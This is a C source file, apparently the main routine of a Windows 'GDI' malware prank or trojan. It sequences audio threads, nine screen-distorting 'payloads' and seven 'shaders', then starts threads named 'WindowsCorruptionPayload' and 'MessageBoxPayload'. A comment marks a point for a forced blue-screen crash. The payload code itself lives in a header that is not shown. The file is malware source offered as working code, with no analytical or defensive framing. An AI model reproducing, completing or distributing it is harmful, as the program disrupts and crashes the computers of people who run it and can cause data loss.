#include "payloads.h"
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpszArgument, int nCmdShow) {
	AUDIO_SEQUENCE_PARAMS pAudioSequences[4] = { 0 };
	pAudioSequences[0] = { 8000, 8000 * 30, AudioSequence1, NULL, NULL };
	pAudioSequences[1] = { 8000, 8000 * 30, AudioSequence2, NULL, NULL };
	pAudioSequences[2] = { 8000, 8000 * 30, AudioSequence3, NULL, NULL };
	pAudioSequences[3] = { 8000, 8000 * 30, AudioSequence4, NULL, NULL };

	SeedXorshift32((DWORD)__rdtsc());

	HMODULE hModUser32 = LoadLibrary(L"user32.dll");
	BOOL(WINAPI * SetProcessDPIAware)(VOID) = (BOOL(WINAPI*)(VOID))GetProcAddress(hModUser32, "SetProcessDPIAware");
	if (SetProcessDPIAware) {
		SetProcessDPIAware();
	}
	FreeLibrary(hModUser32);

	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(InitTimer), (PVOID)1000, 0, NULL);

	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(AudioSequence), (PVOID)&pAudioSequences[0], 0, NULL);
	ExecutePayload(Payload1, PAYLOAD_TIME);
	ExecutePayload(Payload2, PAYLOAD_TIME);
	ExecutePayload(Payload3, PAYLOAD_TIME);
	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(AudioSequence), (PVOID)&pAudioSequences[1], 0, NULL);
	ExecutePayload(Payload4, PAYLOAD_TIME);
	ExecutePayload(Payload5, PAYLOAD_TIME);
	ExecutePayload(Payload6, PAYLOAD_TIME);
	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(AudioSequence), (PVOID)&pAudioSequences[2], 0, NULL);
	ExecutePayload(Payload7, PAYLOAD_TIME);
	ExecutePayload(Payload8, PAYLOAD_TIME);
	ExecutePayload(Payload9, PAYLOAD_TIME);

	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(AudioSequence), (PVOID)&pAudioSequences[3], 0, NULL);
	ExecuteShader(Shader1, PAYLOAD_TIME);
	ExecuteShader(Shader2, PAYLOAD_TIME);
	ExecuteShader(Shader3, PAYLOAD_TIME);
	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(AudioSequence), (PVOID)&pAudioSequences[0], 0, NULL);
	ExecuteShader(Shader4, PAYLOAD_TIME);
	ExecuteShader(Shader5, PAYLOAD_TIME);
	ExecuteShader(Shader6, PAYLOAD_TIME);
	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(AudioSequence), (PVOID)&pAudioSequences[1], 0, NULL);
	ExecuteShader(Shader7, PAYLOAD_TIME);

	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(WindowsCorruptionPayload), NULL, 0, NULL);
	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(MessageBoxPayload), NULL, 0, NULL);
	Sleep(20000);
	//bsod here.
	return 0;
}